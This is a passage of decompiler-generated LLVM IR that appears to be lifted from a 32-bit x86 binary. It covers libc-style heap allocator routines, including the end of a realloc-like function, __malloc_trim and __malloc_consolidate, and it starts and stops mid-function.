  %v2_8050600 = inttoptr i32 %v1_8050600 to i32*
  %v3_8050600 = load i32, i32* %v2_8050600, align 4
  store i32 %v3_8050600, i32* %eax.global-to-local, align 4
  %v1_8050603 = load i32, i32* @edx, align 4
  %v2_8050603 = add i32 %v1_8050603, 4
  %v3_8050603 = inttoptr i32 %v2_8050603 to i32*
  store i32 %v3_8050600, i32* %v3_8050603, align 4
  %v0_8050606 = load i32, i32* @esi, align 4
  %v1_8050606 = add i32 %v0_8050606, 8
  %v2_8050606 = inttoptr i32 %v1_8050606 to i32*
  %v3_8050606 = load i32, i32* %v2_8050606, align 4
  store i32 %v3_8050606, i32* %eax.global-to-local, align 4
  %v1_8050609 = load i32, i32* @edx, align 4
  %v2_8050609 = add i32 %v1_8050609, 8
  %v3_8050609 = inttoptr i32 %v2_8050609 to i32*
  store i32 %v3_8050606, i32* %v3_8050609, align 4
  %tmp28 = icmp ult i32 %v1_80505d7, 17
  br i1 %tmp28, label %dec_label_pc_805063c, label %dec_label_pc_805060e

dec_label_pc_805060e:                             ; preds = %dec_label_pc_80505f5
  %v0_805060e = load i32, i32* @esi, align 4
  %v1_805060e = add i32 %v0_805060e, 12
  %v2_805060e = inttoptr i32 %v1_805060e to i32*
  %v3_805060e = load i32, i32* %v2_805060e, align 4
  store i32 %v3_805060e, i32* %eax.global-to-local, align 4
  %v0_8050611 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050614 = load i32, i32* @edx, align 4
  %v2_8050614 = add i32 %v1_8050614, 12
  %v3_8050614 = inttoptr i32 %v2_8050614 to i32*
  store i32 %v3_805060e, i32* %v3_8050614, align 4
  %v0_8050617 = load i32, i32* @esi, align 4
  %v1_8050617 = add i32 %v0_8050617, 16
  %v2_8050617 = inttoptr i32 %v1_8050617 to i32*
  %v3_8050617 = load i32, i32* %v2_8050617, align 4
  store i32 %v3_8050617, i32* %eax.global-to-local, align 4
  %v1_805061a = load i32, i32* @edx, align 4
  %v2_805061a = add i32 %v1_805061a, 16
  %v3_805061a = inttoptr i32 %v2_805061a to i32*
  store i32 %v3_8050617, i32* %v3_805061a, align 4
  %tmp22 = icmp ult i32 %v0_8050611, 7
  br i1 %tmp22, label %dec_label_pc_805063c, label %dec_label_pc_805061f

dec_label_pc_805061f:                             ; preds = %dec_label_pc_805060e
  %v0_805061f = load i32, i32* @esi, align 4
  %v1_805061f = add i32 %v0_805061f, 20
  %v2_805061f = inttoptr i32 %v1_805061f to i32*
  %v3_805061f = load i32, i32* %v2_805061f, align 4
  store i32 %v3_805061f, i32* %eax.global-to-local, align 4
  %v0_8050622 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050625 = load i32, i32* @edx, align 4
  %v2_8050625 = add i32 %v1_8050625, 20
  %v3_8050625 = inttoptr i32 %v2_8050625 to i32*
  store i32 %v3_805061f, i32* %v3_8050625, align 4
  %v0_8050628 = load i32, i32* @esi, align 4
  %v1_8050628 = add i32 %v0_8050628, 24
  %v2_8050628 = inttoptr i32 %v1_8050628 to i32*
  %v3_8050628 = load i32, i32* %v2_8050628, align 4
  store i32 %v3_8050628, i32* %eax.global-to-local, align 4
  %v1_805062b = load i32, i32* @edx, align 4
  %v2_805062b = add i32 %v1_805062b, 24
  %v3_805062b = inttoptr i32 %v2_805062b to i32*
  store i32 %v3_8050628, i32* %v3_805062b, align 4
  %tmp23 = icmp ult i32 %v0_8050622, 9
  br i1 %tmp23, label %dec_label_pc_805063c, label %dec_label_pc_8050630

dec_label_pc_8050630:                             ; preds = %dec_label_pc_805061f
  %v0_8050630 = load i32, i32* @esi, align 4
  %v1_8050630 = add i32 %v0_8050630, 28
  %v2_8050630 = inttoptr i32 %v1_8050630 to i32*
  %v3_8050630 = load i32, i32* %v2_8050630, align 4
  store i32 %v3_8050630, i32* %eax.global-to-local, align 4
  %v1_8050633 = load i32, i32* @edx, align 4
  %v2_8050633 = add i32 %v1_8050633, 28
  %v3_8050633 = inttoptr i32 %v2_8050633 to i32*
  store i32 %v3_8050630, i32* %v3_8050633, align 4
  %v0_8050636 = load i32, i32* @esi, align 4
  %v1_8050636 = add i32 %v0_8050636, 32
  %v2_8050636 = inttoptr i32 %v1_8050636 to i32*
  %v3_8050636 = load i32, i32* %v2_8050636, align 4
  store i32 %v3_8050636, i32* %eax.global-to-local, align 4
  %v1_8050639 = load i32, i32* @edx, align 4
  %v2_8050639 = add i32 %v1_8050639, 32
  %v3_8050639 = inttoptr i32 %v2_8050639 to i32*
  store i32 %v3_8050636, i32* %v3_8050639, align 4
  br label %dec_label_pc_805063c

dec_label_pc_805063c:                             ; preds = %dec_label_pc_805061f, %dec_label_pc_805060e, %dec_label_pc_80505f5, %dec_label_pc_80505e4, %dec_label_pc_8050630
  %v0_805063f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805063f = add i32 %v0_805063f, 8
  store i32 %v1_805063f, i32* @ebx, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8050646 = call i32 @free(i32 %tmp7)
  br label %dec_label_pc_805076c

dec_label_pc_8050650:                             ; preds = %dec_label_pc_8050511, %dec_label_pc_80505c7, %dec_label_pc_8050595
  %v1_8050661 = phi i32 [ %v1_8050501, %dec_label_pc_8050511 ], [ %v2_80505ce, %dec_label_pc_80505c7 ], [ %v0_8050650.pre, %dec_label_pc_8050595 ]
  %v5_8050652 = sub i32 %v1_8050661, %stack_var_-40.0
  store i32 %v5_8050652, i32* %ecx.global-to-local, align 4
  %tmp24 = icmp ult i32 %v5_8050652, 16
  br i1 %tmp24, label %dec_label_pc_805065b, label %dec_label_pc_805066d

dec_label_pc_805065b:                             ; preds = %dec_label_pc_8050650
  %v0_805065b = load i32, i32* @edi, align 4
  %v1_805065b = add i32 %v0_805065b, 4
  %v2_805065b = inttoptr i32 %v1_805065b to i32*
  %v3_805065b = load i32, i32* %v2_805065b, align 4
  %v1_805065e = urem i32 %v3_805065b, 2
  %v2_8050661 = or i32 %v1_805065e, %v1_8050661
  store i32 %v2_8050661, i32* %eax.global-to-local, align 4
  store i32 %v2_8050661, i32* %v2_805065b, align 4
  %v0_8050666 = load i32, i32* @edi, align 4
  %v1_8050666 = load i32, i32* @ebx, align 4
  %v2_8050666 = add i32 %v0_8050666, 4
  %v3_8050666 = add i32 %v2_8050666, %v1_8050666
  %v4_8050666 = inttoptr i32 %v3_8050666 to i32*
  %v5_8050666 = load i32, i32* %v4_8050666, align 4
  %v6_8050666 = or i32 %v5_8050666, 1
  store i32 %v6_8050666, i32* %v4_8050666, align 4
  br label %dec_label_pc_805069d

dec_label_pc_805066d:                             ; preds = %dec_label_pc_8050650
  %v0_8050671 = load i32, i32* @edi, align 4
  %v2_8050671 = add i32 %v0_8050671, %stack_var_-40.0
  store i32 %v2_8050671, i32* %eax.global-to-local, align 4
  %v1_8050674 = add i32 %v0_8050671, 4
  %v2_8050674 = inttoptr i32 %v1_8050674 to i32*
  %v3_8050674 = load i32, i32* %v2_8050674, align 4
  %v1_8050677 = urem i32 %v3_8050674, 2
  %v5_805067a = or i32 %v1_8050677, %stack_var_-40.0
  store i32 %v5_805067a, i32* %v2_8050674, align 4
  %v0_8050684 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050686 = or i32 %v0_8050684, 1
  store i32 %v1_8050686, i32* @edx, align 4
  %v1_8050689 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050689 = add i32 %v1_8050689, 4
  %v3_8050689 = inttoptr i32 %v2_8050689 to i32*
  store i32 %v1_8050686, i32* %v3_8050689, align 4
  %v0_805068c = load i32, i32* %eax.global-to-local, align 4
  %v1_805068c = load i32, i32* %ecx.global-to-local, align 4
  %v2_805068c = add i32 %v0_805068c, 4
  %v3_805068c = add i32 %v2_805068c, %v1_805068c
  %v4_805068c = inttoptr i32 %v3_805068c to i32*
  %v5_805068c = load i32, i32* %v4_805068c, align 4
  %v6_805068c = or i32 %v5_805068c, 1
  store i32 %v6_805068c, i32* %v4_805068c, align 4
  %v0_8050691 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050691 = add i32 %v0_8050691, 8
  store i32 %v1_8050691, i32* %eax.global-to-local, align 4
  store i32 %v1_8050691, i32* %stack_var_-60, align 4
  %v1_8050695 = call i32 @free(i32 %v1_8050691)
  store i32 %v1_8050695, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805069d

dec_label_pc_805069d:                             ; preds = %dec_label_pc_805065b, %dec_label_pc_805066d
  %v0_805069d = load i32, i32* @edi, align 4
  %v1_805069d = add i32 %v0_805069d, 8
  store i32 %v1_805069d, i32* @ebx, align 4
  br label %dec_label_pc_8050779

dec_label_pc_80506a5:                             ; preds = %dec_label_pc_80504f5
  store i32 %tmp7, i32* %ecx.global-to-local, align 4
  %v0_80506a9 = load i32, i32* @global_var_80607dc.231, align 4
  %v1_80506ae = add i32 %v0_80506a9, -1
  store i32 %v1_80506ae, i32* %eax.global-to-local, align 4
  %v2_80506b3 = inttoptr i32 %v1_80504f9 to i32*
  %v3_80506b3 = load i32, i32* %v2_80506b3, align 4
  store i32 %v3_80506b3, i32* @ebp, align 4
  %v1_80506b6 = or i32 %stack_var_-40.0, 4
  store i32 %v1_80506b6, i32* %stack_var_-44, align 4
  %v2_80506bc = add i32 %v3_80506b3, %v1_80506ae
  store i32 %v2_80506bc, i32* @edx, align 4
  %v1_80506bf = sub i32 0, %v0_80506a9
  store i32 %v1_80506bf, i32* %eax.global-to-local, align 4
  %v2_80506c1 = add i32 %v2_80506bc, %v1_80506b6
  %v2_80506c4 = and i32 %v2_80506c1, %v1_80506bf
  store i32 %v2_80506c4, i32* @esi, align 4
  %v2_80506c8 = sub i32 %v2_80506c4, %v3_80506b3
  store i32 %v2_80506c8, i32* @ebx, align 4
  %v15_80506ca = icmp eq i32 %v1_8050501, %v2_80506c8
  br i1 %v15_80506ca, label %dec_label_pc_8050775, label %dec_label_pc_80506d4

dec_label_pc_80506d4:                             ; preds = %dec_label_pc_80506a5
  %v2_80506db = sub i32 %v1_80504f9, %v3_80506b3
  store i32 %v2_80506db, i32* @edi, align 4
  %v2_80506dd = add i32 %v3_80506b3, %v1_8050501
  store i32 %v2_80506dd, i32* %eax.global-to-local, align 4
  store i32 %v2_80506db, i32* %stack_var_-60, align 4
  %v6_80506e1 = call i32 @mremap(i32 %v2_80506db, i32 %v2_80506dd, i32 %v2_80506c4, i32 1, i32 %v1_80506b6, i32 %v1_8050501)
  store i32 %v6_80506e1, i32* %eax.global-to-local, align 4
  %v10_80506e9 = icmp eq i32 %v6_80506e1, -1
  br i1 %v10_80506e9, label %dec_label_pc_805072d, label %dec_label_pc_80506ee

dec_label_pc_80506ee:                             ; preds = %dec_label_pc_80506d4
  %v1_80506ee = load i32, i32* @ebp, align 4
  %v2_80506ee = add i32 %v1_80506ee, %v6_80506e1
  store i32 %v2_80506ee, i32* @edx, align 4
  %v0_80506f1 = load i32, i32* @ebx, align 4
  %v1_80506f1 = or i32 %v0_80506f1, 2
  store i32 %v1_80506f1, i32* %ebx.global-to-local, align 4
  %v0_80506f4 = load i32, i32* @esi, align 4
  store i32 %v0_80506f4, i32* %eax.global-to-local, align 4
  %v2_80506f6 = add i32 %v2_80506ee, 4
  %v3_80506f6 = inttoptr i32 %v2_80506f6 to i32*
  store i32 %v1_80506f1, i32* %v3_80506f6, align 4
  %v0_80506f9 = load i32, i32* %eax.global-to-local, align 4
  %v5_80506f9 = sub i32 %v0_80506f9, %v1_8050501
  %v1_80506fd = load i32, i32* @global_var_80607e4.236, align 4
  %v2_80506fd = add i32 %v1_80506fd, %v5_80506f9
  store i32 %v2_80506fd, i32* %eax.global-to-local, align 4
  store i32 %v2_80506fd, i32* @global_var_80607e4.236, align 4
  %v1_8050708 = load i32, i32* @global_var_80607f0.237, align 16
  %tmp25 = icmp ugt i32 %v2_80506fd, %v1_8050708
  br i1 %tmp25, label %dec_label_pc_8050710, label %dec_label_pc_8050715

dec_label_pc_8050710:                             ; preds = %dec_label_pc_80506ee
  store i32 %v2_80506fd, i32* @global_var_80607f0.237, align 16
  br label %dec_label_pc_8050715

dec_label_pc_8050715:                             ; preds = %dec_label_pc_80506ee, %dec_label_pc_8050710
  %v1_8050715 = load i32, i32* @global_var_80607e8.238, align 8
  %v2_8050715 = add i32 %v1_8050715, %v2_80506fd
  store i32 %v2_8050715, i32* %eax.global-to-local, align 4
  %v1_805071b = load i32, i32* @global_var_80607f4.239, align 4
  %tmp26 = icmp ugt i32 %v2_8050715, %v1_805071b
  br i1 %tmp26, label %dec_label_pc_8050723, label %dec_label_pc_8050728

dec_label_pc_8050723:                             ; preds = %dec_label_pc_8050715
  store i32 %v2_8050715, i32* @global_var_80607f4.239, align 4
  br label %dec_label_pc_8050728

dec_label_pc_8050728:                             ; preds = %dec_label_pc_8050715, %dec_label_pc_8050723
  %v0_8050728 = load i32, i32* @edx, align 4
  %v1_8050728 = add i32 %v0_8050728, 8
  store i32 %v1_8050728, i32* @ebx, align 4
  br label %dec_label_pc_8050779

dec_label_pc_805072d:                             ; preds = %dec_label_pc_80506d4
  %v2_805072d = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_805072d, i32* %eax.global-to-local, align 4
  %v10_8050730 = icmp ult i32 %v1_8050501, %v2_805072d
  %v1_8050734 = icmp eq i1 %v10_8050730, false
  br i1 %v1_8050734, label %dec_label_pc_8050775, label %dec_label_pc_8050736

dec_label_pc_8050736:                             ; preds = %dec_label_pc_805072d
  %v1_805073d = add i32 %stack_var_-40.0, -7
  store i32 %v1_805073d, i32* %eax.global-to-local, align 4
  store i32 %v1_805073d, i32* %stack_var_-60, align 4
  %v1_8050741 = call i32 @malloc(i32 %v1_805073d)
  store i32 %v1_8050741, i32* %eax.global-to-local, align 4
  store i32 %v1_8050741, i32* @ebx, align 4
  %v1_805074b = icmp eq i32 %v1_8050741, 0
  br i1 %v1_805074b, label %dec_label_pc_8050771, label %dec_label_pc_805074f

dec_label_pc_805074f:                             ; preds = %dec_label_pc_8050736
  %v1_8050754 = add i32 %v1_8050501, -8
  store i32 %v1_8050754, i32* %eax.global-to-local, align 4
  store i32 %v1_8050741, i32* %stack_var_-60, align 4
  %v3_805075d = inttoptr i32 %v1_8050741 to i16*
  %v4_805075d = call i32 @memcpy(i16* %v3_805075d, i32 %tmp7, i32 %v1_8050754)
  store i32 %v4_805075d, i32* %eax.global-to-local, align 4
  store i32 %v1_8050741, i32* @edx, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8050767 = call i32 @free(i32 %tmp7)
  br label %dec_label_pc_805076c

dec_label_pc_805076c:                             ; preds = %dec_label_pc_805063c, %dec_label_pc_805074f
  %storemerge = phi i32 [ %v1_8050767, %dec_label_pc_805074f ], [ %v1_8050646, %dec_label_pc_805063c ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050779

dec_label_pc_8050771:                             ; preds = %dec_label_pc_8050736, %dec_label_pc_80505a0
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8050779

dec_label_pc_8050775:                             ; preds = %dec_label_pc_805072d, %dec_label_pc_80506a5, %dec_label_pc_805053f
  store i32 %tmp7, i32* @ebx, align 4
  br label %dec_label_pc_8050779

dec_label_pc_8050779:                             ; preds = %dec_label_pc_8050771, %dec_label_pc_805076c, %dec_label_pc_8050728, %dec_label_pc_805069d, %dec_label_pc_8050775
  store i32 %v2_80504ae, i32* @eax, align 4
  store i32 %v2_80504ae, i32* %stack_var_-60, align 4
  %v2_8050782 = call i32 @__pthread_return_void(i32 %v2_80504ae, i32 1)
  store i32 %v2_8050782, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050787

dec_label_pc_8050787:                             ; preds = %dec_label_pc_8050492, %dec_label_pc_805047e, %dec_label_pc_8050779
  br label %dec_label_pc_805078a

dec_label_pc_805078a:                             ; preds = %dec_label_pc_80504cc, %dec_label_pc_8050787
  %v0_805078d = load i32, i32* @ebx, align 4
  store i32 %v0_805078d, i32* %eax.global-to-local, align 4
  store i32 %v0_805046f, i32* %ebx.global-to-local, align 4
  store i32 %v0_805046e, i32* @esi, align 4
  ret i32 %v0_805078d

; uselistorder directives
  uselistorder i32 %v1_8050741, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_8050715, { 1, 0, 2 }
  uselistorder i32 %v2_80506fd, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_80506db, { 1, 0, 2 }
  uselistorder i32 %v1_80506b6, { 1, 0, 2 }
  uselistorder i32 %v3_80506b3, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8050671, { 1, 0 }
  uselistorder i32 %v1_80505d7, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_80505ab, { 1, 3, 2, 0, 4, 6, 5, 7 }
  uselistorder i32 %v2_805054f, { 1, 0, 2 }
  uselistorder i32 %v3_8050562, { 0, 2, 1 }
  uselistorder i32 %v2_805051f, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_8050501, { 13, 14, 12, 15, 0, 6, 7, 11, 1, 10, 2, 3, 4, 5, 9, 8, 16 }
  uselistorder i32 %v1_80504f9, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 12, 4, 0, 1, 9, 8, 7, 2, 5, 3, 6, 11, 10 }
  uselistorder i32 %v1_80504ee, { 1, 0 }
  uselistorder i32 %v1_80504de, { 0, 2, 1 }
  uselistorder i32 %v0_80504c7, { 1, 0 }
  uselistorder i32 %v2_80504ae, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp7, { 13, 12, 11, 1, 10, 9, 8, 7, 2, 0, 6, 5, 4, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 50, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 40, 38, 41, 42, 43, 44, 0, 45, 46, 47, 48, 49 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_805078a, { 1, 0 }
  uselistorder label %dec_label_pc_8050787, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050779, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805076c, { 1, 0 }
  uselistorder label %dec_label_pc_8050728, { 1, 0 }
  uselistorder label %dec_label_pc_8050715, { 1, 0 }
  uselistorder label %dec_label_pc_805069d, { 1, 0 }
  uselistorder label %dec_label_pc_8050650, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805063c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8050595, { 1, 0 }
  uselistorder label %dec_label_pc_80504f5, { 1, 0 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_805079b = load i32, i32* @edx, align 4
  store i32 %v0_805079b, i32* %ebp.global-to-local, align 4
  %v1_805079d = add i32 %v0_805079b, 860
  %v2_805079d = inttoptr i32 %v1_805079d to i32*
  %v3_805079d = load i32, i32* %v2_805079d, align 4
  store i32 %v3_805079d, i32* @ecx, align 4
  %v1_80507a3 = add i32 %v0_805079b, 44
  %v2_80507a3 = inttoptr i32 %v1_80507a3 to i32*
  %v3_80507a3 = load i32, i32* %v2_80507a3, align 4
  %v1_80507a6 = add i32 %v3_80507a3, 4
  %v2_80507a6 = inttoptr i32 %v1_80507a6 to i32*
  %v3_80507a6 = load i32, i32* %v2_80507a6, align 4
  %v1_80507a9 = and i32 %v3_80507a6, -4
  store i32 %v1_80507a9, i32* @esi, align 4
  %v1_80507ae = load i32, i32* @eax, align 4
  %v2_80507ae = add i32 %v3_805079d, -17
  %v2_80507b0 = add i32 %v2_80507ae, %v1_80507a9
  %v3_80507b0 = sub i32 %v2_80507b0, %v1_80507ae
  %div = udiv i32 %v3_80507b0, %v3_805079d
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_80507b0, %v3_805079d
  store i32 %tmp10, i32* @edx, align 4
  %v1_80507b8 = add i32 %div, -1
  %v4_80507bb = mul i32 %v1_80507b8, %v3_805079d
  store i32 %v4_80507bb, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_80507bb, 1
  br i1 %tmp11, label %dec_label_pc_8050817, label %dec_label_pc_80507c2

dec_label_pc_80507c2:                             ; preds = %entry
  %v1_80507c7 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_80507c7, i32* %edi.global-to-local, align 4
  %v0_80507ce = load i32, i32* @esi, align 4
  store i32 %v0_80507ce, i32* %eax.global-to-local, align 4
  %v1_80507d0 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80507d0 = add i32 %v1_80507d0, 44
  %v3_80507d0 = inttoptr i32 %v2_80507d0 to i32*
  %v4_80507d0 = load i32, i32* %v3_80507d0, align 4
  %v5_80507d0 = add i32 %v4_80507d0, %v0_80507ce
  store i32 %v5_80507d0, i32* %eax.global-to-local, align 4
  %v12_80507d6 = icmp eq i32 %v1_80507c7, %v5_80507d0
  %v1_80507d8 = icmp eq i1 %v12_80507d6, false
  br i1 %v1_80507d8, label %dec_label_pc_8050817, label %dec_label_pc_80507da

dec_label_pc_80507da:                             ; preds = %dec_label_pc_80507c2
  %v1_80507dd = sub i32 0, %v4_80507bb
  store i32 %v1_80507dd, i32* @ebx, align 4
  %v1_80507e0 = call i32 @__GI_sbrk(i32 %v1_80507dd)
  store i32 %v1_80507e0, i32* %eax.global-to-local, align 4
  %v1_80507ec = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_80507ec, i32* %eax.global-to-local, align 4
  %v10_80507f4 = icmp eq i32 %v1_80507ec, -1
  br i1 %v10_80507f4, label %dec_label_pc_8050817, label %dec_label_pc_80507f9

dec_label_pc_80507f9:                             ; preds = %dec_label_pc_80507da
  %v0_80507f9 = load i32, i32* %edi.global-to-local, align 4
  %v2_80507fb = sub i32 %v0_80507f9, %v1_80507ec
  %v12_80507fb = icmp eq i32 %v2_80507fb, 0
  store i32 %v2_80507fb, i32* @ecx, align 4
  br i1 %v12_80507fb, label %dec_label_pc_8050817, label %dec_label_pc_80507ff

dec_label_pc_80507ff:                             ; preds = %dec_label_pc_80507f9
  %v0_80507ff = load i32, i32* %ebp.global-to-local, align 4
  %v1_80507ff = add i32 %v0_80507ff, 44
  %v2_80507ff = inttoptr i32 %v1_80507ff to i32*
  %v3_80507ff = load i32, i32* %v2_80507ff, align 4
  store i32 %v3_80507ff, i32* %eax.global-to-local, align 4
  %v1_8050802 = add i32 %v0_80507ff, 872
  %v2_8050802 = inttoptr i32 %v1_8050802 to i32*
  %v3_8050802 = load i32, i32* %v2_8050802, align 4
  %v5_8050802 = sub i32 %v3_8050802, %v2_80507fb
  store i32 %v5_8050802, i32* %v2_8050802, align 4
  %v0_8050808 = load i32, i32* @esi, align 4
  %v1_8050808 = load i32, i32* @ecx, align 4
  %v2_8050808 = sub i32 %v0_8050808, %v1_8050808
  %v1_805080a = or i32 %v2_8050808, 1
  %v1_805080d = load i32, i32* %eax.global-to-local, align 4
  %v2_805080d = add i32 %v1_805080d, 4
  %v3_805080d = inttoptr i32 %v2_805080d to i32*
  store i32 %v1_805080a, i32* %v3_805080d, align 4
  br label %dec_label_pc_8050819

dec_label_pc_8050817:                             ; preds = %dec_label_pc_80507f9, %dec_label_pc_80507da, %dec_label_pc_80507c2, %entry
  br label %dec_label_pc_8050819

dec_label_pc_8050819:                             ; preds = %dec_label_pc_80507ff, %dec_label_pc_8050817
  %storemerge = phi i32 [ 1, %dec_label_pc_80507ff ], [ 0, %dec_label_pc_8050817 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80507ec, { 1, 0, 2 }
  uselistorder i32 %v4_80507bb, { 1, 2, 0 }
  uselistorder i32 %v3_805079d, { 0, 3, 2, 1, 4 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8050819, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_8050822 = load i32, i32* @edi, align 4
  %v0_8050823 = load i32, i32* @esi, align 4
  %v0_8050824 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_805082c = load i32, i32* %arg1, align 4
  store i32 %v2_805082c, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_8050833 = icmp eq i32 %v2_805082c, 0
  br i1 %v1_8050833, label %dec_label_pc_805095c.preheader, label %dec_label_pc_805083b

dec_label_pc_805095c.preheader:                   ; preds = %entry
  %v3_8050951 = add i32 %tmp11, 44
  br label %dec_label_pc_805094d

dec_label_pc_805083b:                             ; preds = %entry
  %v1_805083f = and i32 %v2_805082c, -3
  store i32 %v1_805083f, i32* %arg1, align 4
  %v1_8050844 = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_805084f = add i32 %tmp11, 4
  store i32 %v1_805084f, i32* %eax.global-to-local, align 4
  %v2_805085a = load i32, i32* %arg1, align 4
  %v2_8050860 = udiv i32 %v2_805085a, 8
  %v2_8050863 = mul nuw i32 %v2_8050860, 4
  %v3_8050863 = add i32 %tmp11, -4
  %v4_8050863 = add i32 %v3_8050863, %v2_8050863
  store i32 %v4_8050863, i32* %eax.global-to-local, align 4
  %v2_805092a = add i32 %tmp11, 44
  %v3_805092a = inttoptr i32 %v2_805092a to i32*
  %v1_80508fd = add i32 %tmp11, 60
  %v2_80508fd = inttoptr i32 %v1_80508fd to i32*
  br label %dec_label_pc_805086b

dec_label_pc_805086b:                             ; preds = %dec_label_pc_8050943, %dec_label_pc_805083b
  %v0_8050879 = phi i32 [ %v1_805084f, %dec_label_pc_805083b ], [ %v4_8050943, %dec_label_pc_8050943 ]
  store i32 %v0_8050879, i32* %eax.global-to-local, align 4
  %v1_805086f = inttoptr i32 %v0_8050879 to i32*
  %v2_805086f = load i32, i32* %v1_805086f, align 4
  store i32 %v2_805086f, i32* @ecx, align 4
  %v1_8050871 = icmp eq i32 %v2_805086f, 0
  br i1 %v1_8050871, label %dec_label_pc_8050939, label %dec_label_pc_8050879

dec_label_pc_8050879:                             ; preds = %dec_label_pc_805086b
  store i32 0, i32* %v1_805086f, align 4
  %v0_805087f.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805087f

dec_label_pc_805087f:                             ; preds = %dec_label_pc_805092d, %dec_label_pc_8050879
  %v0_805089c = phi i32 [ %v3_805087f, %dec_label_pc_805092d ], [ %v0_805087f.pre, %dec_label_pc_8050879 ]
  %v1_805087f = add i32 %v0_805089c, 8
  %v2_805087f = inttoptr i32 %v1_805087f to i32*
  %v3_805087f = load i32, i32* %v2_805087f, align 4
  store i32 %v3_805087f, i32* %edx.global-to-local, align 4
  %v1_8050886 = add i32 %v0_805089c, 4
  %v2_8050886 = inttoptr i32 %v1_8050886 to i32*
  %v3_8050886 = load i32, i32* %v2_8050886, align 4
  store i32 %v3_8050886, i32* %eax.global-to-local, align 4
  %v1_805088b = and i32 %v3_8050886, -2
  store i32 %v1_805088b, i32* @edi, align 4
  %v2_805088e = urem i32 %v3_8050886, 2
  %v3_805088e = icmp eq i32 %v2_805088e, 0
  %v2_8050890 = add i32 %v1_805088b, %v0_805089c
  store i32 %v2_8050890, i32* @ebx, align 4
  %v1_8050893 = add i32 %v2_8050890, 4
  %v2_8050893 = inttoptr i32 %v1_8050893 to i32*
  %v3_8050893 = load i32, i32* %v2_8050893, align 4
  store i32 %v3_8050893, i32* %edx.global-to-local, align 4
  %v1_805089a = icmp eq i1 %v3_805088e, false
  br i1 %v1_805089a, label %dec_label_pc_80508bc, label %dec_label_pc_805089c

dec_label_pc_805089c:                             ; preds = %dec_label_pc_805087f
  %v1_805089c = inttoptr i32 %v0_805089c to i32*
  %v2_805089c = load i32, i32* %v1_805089c, align 4
  store i32 %v2_805089c, i32* %ebp.global-to-local, align 4
  %v2_80508a0 = sub i32 %v0_805089c, %v2_805089c
  store i32 %v2_80508a0, i32* %eax.global-to-local, align 4
  %v1_80508a2 = add i32 %v2_80508a0, 8
  %v2_80508a2 = inttoptr i32 %v1_80508a2 to i32*
  %v3_80508a2 = load i32, i32* %v2_80508a2, align 4
  store i32 %v3_80508a2, i32* @esi, align 4
  %v1_80508a5 = add i32 %v2_80508a0, 12
  %v2_80508a5 = inttoptr i32 %v1_80508a5 to i32*
  %v3_80508a5 = load i32, i32* %v2_80508a5, align 4
  store i32 %v3_80508a5, i32* %edx.global-to-local, align 4
  %v1_80508a8 = add i32 %v3_80508a2, 12
  %v2_80508a8 = inttoptr i32 %v1_80508a8 to i32*
  %v3_80508a8 = load i32, i32* %v2_80508a8, align 4
  store i32 %v3_80508a8, i32* @ecx, align 4
  %v12_80508ab = icmp eq i32 %v3_80508a8, %v2_80508a0
  %v1_80508ad = icmp eq i1 %v12_80508ab, false
  br i1 %v1_80508ad, label %dec_label_pc_80508ec, label %dec_label_pc_80508af

dec_label_pc_80508af:                             ; preds = %dec_label_pc_805089c
  %v1_80508af = add i32 %v3_80508a5, 8
  %v2_80508af = inttoptr i32 %v1_80508af to i32*
  %v3_80508af = load i32, i32* %v2_80508af, align 4
